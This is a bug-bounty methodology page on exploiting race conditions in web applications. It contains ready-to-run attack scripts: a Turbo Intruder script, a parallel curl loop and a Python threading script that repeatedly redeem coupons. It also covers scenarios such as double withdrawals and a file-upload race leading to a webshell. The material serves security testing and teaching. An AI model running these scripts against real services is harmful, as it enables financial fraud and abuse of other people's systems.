# Race Conditions

## Overview
Race conditions occur when the outcome of an operation depends on the timing of concurrent events. In web applications, this means sending multiple requests simultaneously to exploit the gap between a check (e.g., "does the user have a coupon?") and the action (e.g., "apply the coupon"). This class of bug can lead to financial manipulation, duplicate transactions, and privilege escalation.

## When This Happens

- Coupon/discount code application (apply the same code multiple times)
- Balance transfers or withdrawals (withdraw more than the balance)
- Vote/like systems (vote multiple times)
- Registration (create duplicate accounts)
- File upload + processing (access before validation)
- Rate limiting bypass (send parallel requests within window)

## Recon / Detection

### Identify race-prone features
Any feature where:
1. A resource is **checked** (e.g., "coupon unused?")
2. Then **consumed** (e.g., "mark coupon as used")
3. And the gap between check and consume is non-atomic

### Test methodology
```
1. Capture the target request in Burp
2. Send to Turbo Intruder or Repeater (parallel tab group)
3. Send 20-50 identical requests simultaneously
4. Compare responses — did the action succeed multiple times?
```

## Exploitation Steps

### 1. Using Burp Suite's "Send group in parallel"
1. Capture the request (e.g., "Apply coupon" POST request).
2. Right-click → Send to Repeater → duplicate the tab 20 times.
3. Select all tabs → right-click → "Send group in parallel (last-byte sync)".
4. Check: did the coupon apply more than once?

### 2. Using Turbo Intruder
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=30,
        requestsPerConnection=1,
        pipeline=False
    )
    for i in range(30):
        engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```

### 3. Using curl + bash
```bash
# Send 50 parallel requests
for i in $(seq 1 50); do
  curl -s -X POST "https://target.com/apply-coupon" \
    -H "Cookie: session=..." \
    -d "code=DISCOUNT50" &
done
wait
```

### 4. Using Python threading
```python
import threading
import requests

url = "https://target.com/api/redeem"
headers = {"Cookie": "session=..."}
data = {"code": "FREEITEM"}

def send():
    r = requests.post(url, headers=headers, data=data)
    print(r.status_code, r.text[:100])

threads = [threading.Thread(target=send) for _ in range(50)]
for t in threads: t.start()
for t in threads: t.join()
```

## Common Race Condition Scenarios

### Coupon / discount abuse
```
Send 20 parallel "apply coupon" requests
→ Coupon applied 20 times instead of 1
→ Financial impact
```

### Double withdrawal
```
Balance: $100
Send 10 parallel "withdraw $100" requests
→ Multiple withdrawals succeed before balance check catches up
→ Withdraw $500+ from $100 balance
```

### Follow / Like inflation
```
Send 100 parallel "follow user" or "like post" requests
→ Count incremented 100 times instead of 1
```

### Account registration limit bypass
```
Send 10 parallel registration requests with same email
→ Multiple accounts created with same email
→ May bypass email verification
```

### File upload race
```
Upload malicious file → server stores it temporarily
→ Access the file URL before validation/deletion runs
→ RCE via webshell executed during the validation window
```

## Single-packet Attack (HTTP/2)

In HTTP/2, multiple requests can be sent in a **single TCP packet**, ensuring they arrive at the server at exactly the same time:

```
1. Prepare all requests in Burp
2. Send as HTTP/2 group → single-packet delivery
3. Removes network jitter — pure server-side race
```

This is the most reliable race condition technique.

## Tools

- **Burp Suite** (Repeater group send, Turbo Intruder)
- **race-the-web**: Go-based race condition testing tool
- **Custom scripts** (Python threading, bash parallel curl)

## Real-World Notes

- Race conditions are **underreported** in bug bounties — many hunters don't test for them.
- Financial impact races (coupon, balance, payment) are **critical severity**.
- Server-side mitigations: database locks, atomic operations, idempotency keys.
- Test **every state-changing operation** — not just financial ones.

## References

- `methodology/exploitation-methodology.md`
- `methodology/bug-bounty-playbook.md`
